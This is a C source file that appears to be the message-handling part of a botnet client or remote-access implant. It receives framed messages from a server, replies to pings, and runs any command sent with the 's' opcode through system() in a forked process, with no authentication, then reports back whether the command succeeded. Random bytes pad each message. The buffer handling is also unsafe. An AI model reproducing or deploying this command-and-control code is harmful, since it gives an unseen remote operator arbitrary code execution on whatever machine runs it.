#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>

#include "constants.h"
#include "protocol.h"
#include "rand.h"
#include "serialization.h"
#include "util.h"

int protocol_process_msg(int sockfd, unsigned char *msg) {
    int sysret;
    char *tosend;
    uint8_t rnd1, rnd2;
    char msg_content[MAX_MSG_SIZE];

    tosend = NULL;
    unpack(msg, "CsC", &rnd1, msg_content, &rnd2);

#ifdef DEBUG
    fprintf(stderr,
            "Received message with the following information: {%u, %s, %u}\n",
            rnd1, msg_content, rnd2);
#endif

    switch (msg_content[0]) {
        case 'p': /* if we receive ping message, send pong back */
#ifdef DEBUG
            fprintf(stderr, "[+] Got ping message, sending pong back\n");
#endif
            tosend = "P";
            break;

        case 's':
#ifdef DEBUG
            fprintf(stderr, "[+] Got command message, running command \"%s\"\n",
                    msg_content + 1);
#endif
            if (!fork()) {
                sysret = system(msg_content + 1); /* skip opcode */
#ifdef DEBUG
                fprintf(stderr, "[+] Process returned %d\n", sysret);
#endif
                if (sysret == EXIT_SUCCESS) { /* if command succeeded */
                    tosend = "suc";
                } else {
                    tosend = "fail";
                }
                protocol_format_send_msg(sockfd, tosend, NULL);
                exit(EXIT_SUCCESS); /* we're not acting on this anyways */
            }
            break;

        default:
#ifdef DEBUG
            fprintf(stderr, "[+] Got unimplemented message\n");
#endif
            tosend = "unimplemented";
            break;
    }
    if (msg_content[0] != 's') {
        sockfd = protocol_format_send_msg(
            sockfd, tosend, NULL); /* avoid double send with 's' command */
    }
    return sockfd;
}

int protocol_format_send_msg(int sockfd, char *msg, fd_set *master) {
    uint8_t rnd1, rnd2;
    uint32_t msglen;
    unsigned char msglen_buf[sizeof(unsigned int)];
    unsigned char buf[MAX_MSG_SIZE];

    rnd1 = (uint8_t)rand_range(1, 255);
    rnd2 = (uint8_t)rand_range(1, 255);

    msglen = pack(buf, "CsC", rnd1, msg, rnd2);

    /* Send length of packet before sending packet so caller knows how much to
     * recv */
    pack(msglen_buf, "L", msglen);
    if (send_all(sockfd, msglen_buf, sizeof(unsigned int)) == -1) {
        goto cleanup;
    }

#ifdef DEBUG
    fprintf(stderr,
            "Sending packet with length %u with the following information: "
            "{%u, %s, %u}\n",
            msglen, rnd1, msg, rnd2);
#endif

    /* Send actual packet */
    if (send_all(sockfd, buf, msglen) == -1) {
        goto cleanup;
    }

    return sockfd;

cleanup:
    if (master) {
        FD_CLR(sockfd, master);
    }
    close(sockfd);
    sockfd = -1;
    return sockfd;
}

int protocol_message_receive_and_process(int server_fd) {
    ssize_t n;
    uint32_t msglen;
    unsigned char buf[MAX_MSG_SIZE];
    unsigned char msglen_buf[sizeof(uint32_t)];

    memset(buf, '\0', sizeof(buf) / sizeof(char));
    memset(msglen_buf, '\0', sizeof(msglen_buf) / sizeof(char));

    /* receive packet length */
    n = recv(server_fd, msglen_buf, sizeof(unsigned int), RECV_FLAGS);

    if (n == 0 || n == -1) {
        goto server_cleanup;
    }

    /* deserialize uint32_t msglen into variable */
    unpack(msglen_buf, "L", &msglen);

    /* sanity check */
    if (msglen > MAX_MSG_SIZE) {
        msglen = MAX_MSG_SIZE;
    }

#ifdef DEBUG
    fprintf(stderr,
            "protocol_message_receive_and_process: received packet with length "
            "of %u\n",
            msglen);
#endif
    n = recv(server_fd, buf, msglen, RECV_FLAGS);

    if (n == 0 || n == -1) {
        goto server_cleanup;
    }

    protocol_process_msg(server_fd, buf); /* skip random byte */

    return server_fd;

server_cleanup:
#ifdef DEBUG
    perror("We need to reopen the connection");
#endif
    close(server_fd);
    return -1;
}